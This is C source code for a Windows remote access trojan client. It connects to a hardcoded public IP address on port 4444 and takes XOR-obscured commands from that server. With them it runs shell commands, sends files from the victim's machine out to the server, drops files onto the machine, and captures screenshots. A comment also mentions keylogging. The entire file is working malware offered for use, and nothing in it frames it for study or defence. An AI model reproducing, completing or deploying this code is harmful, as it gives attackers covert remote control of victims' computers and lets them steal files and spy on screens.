#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Link Winsock library
#pragma comment(lib, "user32.lib") // Link User32 library for keylogging and screenshots

#define SERVER_IP "47.156.134.231" // Replace with your public IP
#define SERVER_PORT 4444
#define BUFFER_SIZE 4096
#define XOR_KEY 0xAA // XOR encryption key for communication

// XOR encryption/decryption
void xor_encrypt_decrypt(char *data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Execute system commands
void execute_system_command(char *command, char *response) {
    FILE *pipe = _popen(command, "r");
    if (!pipe) {
        snprintf(response, BUFFER_SIZE, "Failed to execute command.");
        return;
    }

    fgets(response, BUFFER_SIZE, pipe);
    _pclose(pipe);
}

// Upload a file from client to server
void upload_file(const char *filename, SOCKET sock) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        char response[] = "File not found.\n";
        send(sock, response, strlen(response), 0);
        return;
    }

    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        send(sock, buffer, bytes_read, 0);
    }

    fclose(file);
    char response[] = "File upload complete.\n";
    send(sock, response, strlen(response), 0);
}

// Download a file to the client
void download_file(const char *filename, SOCKET sock) {
    FILE *file = fopen(filename, "wb");
    if (!file) {
        printf("Failed to create file.\n");
        return;
    }

    char buffer[BUFFER_SIZE];
    int bytes_received;
    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
        fwrite(buffer, 1, bytes_received, file);
        if (bytes_received < BUFFER_SIZE) break;
    }

    fclose(file);
}

// Capture a screenshot
void capture_screenshot(const char *filename) {
    HWND hwndDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hwndDesktop);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
    RECT desktopRect;
    GetWindowRect(hwndDesktop, &desktopRect);

    int width = desktopRect.right - desktopRect.left;
    int height = desktopRect.bottom - desktopRect.top;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMemory, hBitmap);
    BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    ReleaseDC(hwndDesktop, hdcScreen);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bmfHeader.bfType = 0x4D42; // "BM"
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (width * height * 4);
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Negative to flip the image vertically
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    FILE *file = fopen(filename, "wb");
    if (!file) {
        printf("Failed to create screenshot file.\n");
        return;
    }

    fwrite(&bmfHeader, sizeof(bmfHeader), 1, file);
    fwrite(&bi, sizeof(bi), 1, file);

    int imageSize = width * height * 4;
    BYTE *imageData = malloc(imageSize);
    GetDIBits(hdcMemory, hBitmap, 0, height, imageData, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
    fwrite(imageData, 1, imageSize, file);

    free(imageData);
    fclose(file);

    DeleteObject(hBitmap);
    DeleteDC(hdcMemory);

    printf("Screenshot saved to %s.\n", filename);
}

// Handle commands from the server
void handle_command(char *command, SOCKET sock) {
    char response[BUFFER_SIZE] = {0};

    if (strncmp(command, "exec ", 5) == 0) {
        execute_system_command(command + 5, response);
        send(sock, response, strlen(response), 0);
    } else if (strncmp(command, "upload ", 7) == 0) {
        upload_file(command + 7, sock);
    } else if (strncmp(command, "download ", 9) == 0) {
        download_file(command + 9, sock);
    } else if (strncmp(command, "screenshot", 10) == 0) {
        capture_screenshot("screenshot.bmp");
        send(sock, "Screenshot saved as screenshot.bmp\n", 35, 0);
    } else {
        snprintf(response, BUFFER_SIZE, "Unknown command.");
        send(sock, response, strlen(response), 0);
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection to server failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connected to server.\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        if (recv(sock, buffer, sizeof(buffer), 0) <= 0) {
            printf("Server disconnected or error receiving data.\n");
            break;
        }

        xor_encrypt_decrypt(buffer, strlen(buffer), XOR_KEY);
        printf("Command received: %s\n", buffer);

        handle_command(buffer, sock);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
